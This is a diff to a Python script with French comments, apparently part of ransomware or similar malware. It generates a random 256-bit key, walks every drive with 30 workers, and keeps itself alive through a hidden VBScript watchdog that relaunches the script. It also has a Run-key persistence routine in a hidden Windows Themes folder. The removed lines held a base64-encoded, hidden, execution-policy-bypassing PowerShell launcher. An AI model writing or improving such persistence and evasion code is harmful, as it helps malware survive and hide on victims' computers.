@@ -12,13 +12,16 @@ import time
 import random
 import base64
 import psutil
+import tempfile
 
+# Template VBS amélioré
 vbs_template = r'''On Error Resume Next
 Set WshShell = CreateObject("WScript.Shell")
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
 target = "{script_path}"
 watchdogName = "watchdog.vbs"
 
+' Empêcher plusieurs watchdogs
 Set colMe = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' OR Name='cscript.exe'")
 count = 0
 For Each proc In colMe
@@ -26,31 +29,31 @@ For Each proc In colMe
         count = count + 1
     End If
 Next
-If count > 1 Then
-    WScript.Quit
-End If
-
-Randomize
-WScript.Sleep (Int((80 * Rnd) + 10) * 1000)
+If count > 1 Then WScript.Quit
 
 Do
     found = False
-    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='python.exe' OR Name='pythonw.exe'")
+    Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%python%.exe'")
     For Each objProcess In colProcessList
-        If InStr(LCase(objProcess.CommandLine), LCase(" " & target & " ")) > 0 Or _
-           Right(LCase(objProcess.CommandLine), Len(target)) = LCase(target) Then
+        ' Vérification EXACTE du script avec chemin complet
+        If InStr(LCase(objProcess.CommandLine), LCase(target)) > 0 Then
             found = True
             Exit For
         End If
     Next
 
     If Not found Then
-        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process -WindowStyle Hidden -FilePath 'pythonw.exe' -ArgumentList '" & target & "'""", 0, False
+        ' Relance Python uniquement si aucun processus avec target n'est trouvé
+        WshShell.Run "python.exe """ & target & """", 0, False
+        WScript.Sleep 3000
     End If
 
     WScript.Sleep 5000
 Loop
 '''
+
+PID_FILE = os.path.join(tempfile.gettempdir(), "watchdog.pid")
+LOCK_FILE = os.path.join(tempfile.gettempdir(), "watchdog.lock")
 
 key = os.urandom(32)  # 256 bits
 
@@ -94,78 +97,167 @@ def deleteVbsFileAfterFinish():
         except Exception as e:
             print(f"[!] Erreur suppresion watchdog dans {file}: {e}")
 
+def write_watchdog_pid(pid: int):
+    """Écrit le PID du watchdog dans un fichier"""
+    try:
+        with open(PID_FILE, "w") as f:
+            f.write(str(pid))
+    except Exception as e:
+        print(f"[!] Erreur lors de l'écriture du PID : {e}")
+
+def create_lock_file():
+    """Crée un fichier lock pour éviter les lancements multiples"""
+    try:
+        if os.path.exists(LOCK_FILE):
+            # Vérifier si le processus est toujours actif
+            try:
+                with open(LOCK_FILE, 'r') as f:
+                    pid = int(f.read().strip())
+                if psutil.pid_exists(pid):
+                    proc = psutil.Process(pid)
+                    if 'python' in proc.name().lower():
+                        return False  # Lock actif
+            except:
+                pass
+        
+        # Créer le lock
+        with open(LOCK_FILE, 'w') as f:
+            f.write(str(os.getpid()))
+        return True
+    except:
+        return False
+
+def remove_lock_file():
+    """Supprime le fichier lock"""
+    try:
+        if os.path.exists(LOCK_FILE):
+            os.remove(LOCK_FILE)
+    except:
+        pass
+
+def is_watchdog_vbs_running():
+    """Vérifie si un watchdog VBS est déjà en cours d'exécution"""
+    try:
+        for proc in psutil.process_iter(['name', 'cmdline']):
+            try:
+                if proc.info['name'] and ('wscript.exe' in proc.info['name'].lower() or 'cscript.exe' in proc.info['name'].lower()):
+                    if proc.info['cmdline'] and 'watchdog.vbs' in ' '.join(proc.info['cmdline']).lower():
+                        return True
+            except:
+                continue
+    except:
+        pass
+    return False
+
+def get_python_processes():
+    """Obtient tous les processus Python avec leurs arguments"""
+    processes = []
+    try:
+        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+            try:
+               if proc.info['name'] and 'python' in proc.info['name'].lower():
+                    processes.append({
+                        'pid': proc.info['pid'],
+                        'name': proc.info['name'],
+                        'cmdline': ' '.join(proc.info['cmdline']) if proc.info['cmdline'] else ''
+                    })
+            except:
+                continue
+    except:
+        pass
+    return processes
+
+def is_script_already_running(script_path):
+    """Vérifie si le script est déjà en cours d'exécution avec le chemin exact"""
+    current_pid = os.getpid()
+    script_path_normalized = os.path.abspath(script_path).lower()
+    
+    try:
+        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+            try:
+                if proc.info['pid'] == current_pid:
+                    continue
+                    
+                if proc.info['name'] and 'python' in proc.info['name'].lower():
+                    cmdline = ' '.join(proc.info['cmdline']).lower() if proc.info['cmdline'] else ''
+                    
+                    # Vérifier si le chemin du script est dans la commande
+                    if script_path_normalized in cmdline:
+                        return True
+                        
+                    # Vérifier avec des guillemets
+                    if '"' + script_path_normalized + '"' in cmdline:
+                        return True
+                        
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                continue
+    except:
+        pass
+    return False
 
 def create_watchdog_vbs():
-    script_final = vbs_template.format(script_path=script_python_path.replace("\\", "\\\\"))
-    b64_vbs = base64.b64encode(script_final.encode()).decode()
-    DETACHED_PROCESS = 0x00000008
-    CREATE_NEW_PROCESS_GROUP = 0x00000200
+    global vbsFile
+    
+    # Vérifier si le script est déjà surveillé
+    if is_script_already_running(script_python_path):
+        print("[!] Script déjà en cours d'exécution")
+        return False
 
+    script_final = vbs_template.format(script_path=script_python_path.replace("\\", "\\\\"))
+    
+    # Choisir le dossier pour le VBS
+    vbs_path = None
     for folder in target_dirs:
         try:
-            if not os.path.exists(folder):
-                os.makedirs(folder)
-                
-            
-            existing_vbs = [
-                f for f in os.listdir(folder)
-                if f.lower().endswith('.vbs') and f.lower().startswith('watchdog')
-            ]
-            
-            if existing_vbs:
-                print(f"[!] Fichier watchdog déjà présent dans {folder}, watchdog non créé.")
-                vbs_exist_path = os.path.join(folder, existing_vbs[0])
-                if is_watchdog_running(vbs_exist_path):
-                    print(f"[!] Watchdog déjà actif : {vbs_exist_path}")
-                    return
-                else:
-                    subprocess.Popen(
-                        ["wscript.exe", vbs_exist_path],
-                        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
-                        stdin=subprocess.DEVNULL)
-                    return
-
+            Path(folder).mkdir(parents=True, exist_ok=True)
             vbs_path = os.path.join(folder, "watchdog.vbs")
-            vbsFile.append(vbs_path)
+            break
+        except Exception as e:
+            print(f"Erreur préparation dossier {folder}: {e}")
 
-            escaped_vbs_path = vbs_path.replace("\\", "\\\\")
+    if not vbs_path:
+        print("[!] Impossible de déterminer un chemin pour watchdog.vbs")
+        return False
 
-            #mettre vbs en memoire avec base64 
-            powershell_command = (
-                f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command '
-                f'"$b64 = \'{b64_vbs}\'; '
-                f'$vbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)); '
-                f'[System.IO.File]::WriteAllText(\'{escaped_vbs_path}\', $vbs); '
-                f'Start-Process -WindowStyle Hidden wscript.exe \'{escaped_vbs_path}\'"'
-            )
-            subprocess.Popen(
-                powershell_command,
-                shell=True,
-                creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                stdin=subprocess.DEVNULL
-            )
-            #with open(vbs_path, "w", encoding="utf-8") as f:
-            #    f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
-            print(f"Watchdog créé dans {vbs_path}")
-        except Exception as e:  
-            print(f"Erreur création watchdog dans {folder}: {e}")
+    try:
+        # Écrire le VBS sur disque
+        with open(vbs_path, "w", encoding="utf-8") as f:
+            f.write(script_final)
+        vbsFile.append(vbs_path)
 
-def is_watchdog_running(watchdog_vbs_path):
-    watchdog_vbs_path = watchdog_vbs_path.lower()
-    for proc in psutil.process_iter(['name', 'cmdline']):
-        try:
-            name = proc.info['name']
-            cmdline = proc.info['cmdline']
-            if name and 'wscript.exe' in name.lower():
-                if cmdline and any(watchdog_vbs_path in arg.lower() for arg in cmdline):
-                    return True
-        except (psutil.NoSuchProcess, psutil.AccessDenied):
-            continue
-    return False
+        # Lancer wscript.exe
+        proc = subprocess.Popen(
+            ["wscript.exe", vbs_path],
+            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL
+        )
+
+        write_watchdog_pid(proc.pid)
+        print(f"[+] Watchdog lancé (PID={proc.pid}) : {vbs_path}")
+        return True
+
+    except Exception as e:
+        print(f"Erreur création/lancement watchdog : {e}")
+        return False
+
+def cleanup_watchdog():
+    """Nettoie les ressources du watchdog"""
+    remove_lock_file()
+    
+    # Tuer les processus watchdog si nécessaire
+    try:
+        for proc in psutil.process_iter(['name', 'cmdline']):
+            try:
+                if proc.info['name'] and ('wscript.exe' in proc.info['name'].lower() or 'cscript.exe' in proc.info['name'].lower()):
+                    if proc.info['cmdline'] and 'watchdog.vbs' in ' '.join(proc.info['cmdline']).lower():
+                        proc.terminate()
+            except:
+                continue
+    except:
+        pass
+
 
 def ajouter_run_key_watchdog():
     hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
@@ -305,9 +397,11 @@ def main():
     existDir = os.path.dirname(os.path.abspath(__file__))
     if existDir.lower() not in folders_exclus:
         folders_exclus.append(existDir.lower())
-
-    create_watchdog_vbs()
-    ajouter_run_key_watchdog()
+        # Exécuter une seule fois au lieu d'une boucle infinie
+    result = create_watchdog_vbs()
+    time.sleep(0.5)
+    # ajouter_run_key_watchdog()
+    # time.sleep(0.5)
 
     lecteurs = get_existing_root_path()
     max_workers = 30
